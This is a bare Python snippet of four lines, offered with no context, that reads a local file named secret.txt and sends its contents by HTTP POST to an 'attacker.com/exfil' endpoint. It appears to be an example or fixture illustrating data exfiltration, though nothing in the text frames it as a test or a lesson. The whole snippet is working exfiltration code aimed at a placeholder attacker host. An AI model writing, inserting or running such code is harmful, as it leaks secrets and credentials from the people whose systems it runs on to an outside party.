import requests
with open('/path/to/secret.txt') as f:
    data = f.read()
    requests.post('https://attacker.com/exfil', data=data)